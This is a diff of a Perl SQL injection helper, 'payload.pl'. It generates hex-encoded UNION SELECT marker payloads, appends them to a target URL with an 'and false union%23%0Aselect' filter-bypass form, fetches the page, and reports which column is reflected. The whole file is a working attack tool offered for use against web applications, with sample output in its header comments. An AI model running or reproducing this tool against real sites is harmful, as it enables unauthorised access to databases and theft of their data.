@@ -1,23 +1,30 @@
 #!/usr/bin/perl
 
 																																
-#	What the script does : This script will help you with SQli that hide the vulnerable column in the source.                  
-#	Developper : Crown - 05/09/13 																								
-#	Usage : ./payload.pl <number of column> <size of column name>																
+#	What the script does ? : This script will help you with SQli that hide the vulnerable column in the source.                  
+#	Developper : Crown - 05/09/13 - Last update 09/06/14 																								
+#	Usage : ./payload.pl <number of column> <size of column name> <target url> <ending delimiter>														
 # 																																
-#	Exemple : ./payload.pl 5 6                                                                                                  
+#	Exemple : ./payload.pl 6 4  "http://www.site.com/xxxx.php?xx=x" "xx"                                                                                                
 #	Output :																													
 #																																
-#	Payload with 5 column(s) (6 chars) : 'uBcI-1','MkPC-2','1xes-3','Bczk-4','sEb3-5'											
-#	Payload (hex mode) with 5 column(s) (6 chars) : 0x754263492d31,0x4d6b50432d32,0x317865732d33,0x42637a6b2d34,0x734562332d35	 
+#	Payload with 6 column(s) (4 chars) : 'ML-1','r4-2','BE-3','bD-4','2H-5','HT-6'
+#	Payload (hex mode) with 6 column(s) (4 chars) : 0x4d4c2d31,0x72342d32,0x42452d33,0x62442d34,0x32482d35,0x48542d36 
+#	Full URL :==> http://www.xxxx.com./xxx.php?xxx=x and false union%23%0Aselect 0x4d4c2d31,0x72342d32,0x42452d33,0x62442d34,0x32482d35,0x48542d36--
+#
+#	Vulnerable column : (x) with payload : xxxx
+#	Vulnerable column : (x) with payload : xxxx
+
+
+
 
 use strict;
 use warnings;
 use LWP::Simple;
 
-if(defined($ARGV[0]) == 0 || defined($ARGV[1]) == 0) 
+if(defined($ARGV[0]) == 0 || defined($ARGV[1]) == 0 || defined($ARGV[2]) == 0  || defined($ARGV[3]) == 0 ) 
 {
-	print("Usage : $0 <number of column> <size of column name>\n"); 
+	print("Usage : $0 <number of column> <size of column name> <target url> <ending delimiter>\n"); 
 	exit(1); 
 }
 
@@ -49,25 +56,24 @@ for(my $p = 1; $p <= $number_column; $p++)
 print "Payload with $number_column column(s) ($length_column_string chars) : $column\n\n";
 print "Payload (hex mode) with $number_column column(s) ($length_column_string chars) : $column_hex\n\n";
 
-if(defined($ARGV[2]) == 1 && defined($ARGV[3]) == 1)
-{
-	my $link = $ARGV[2]." union select $column_hex".$ARGV[3];
-	my $source =  get($link);
-	my $z = 1;
 
-	print "Full URL :==> $link\n\n";
-	
-	foreach my $x (@columns) 
+my $link = $ARGV[2]." and false union%23%0Aselect $column_hex".$ARGV[3];
+my $source =  get($link);
+my $z = 1;
+
+print "Full URL :==> $link\n\n";
+
+foreach my $x (@columns) 
+{
+	$x =~ s/'//g;
+
+	if($source =~ /$x/)
 	{
-		$x =~ s/'//g;
-	
-		if($source =~ /$x/)
-		{
-			print "Vulnerable column : ($z) with payload : $x\n";
-		}
-	
-		$z++;
+		print "Vulnerable column : ($z) with payload : $x\n";
 	}
+
+	$z++;
 }
+
 
 
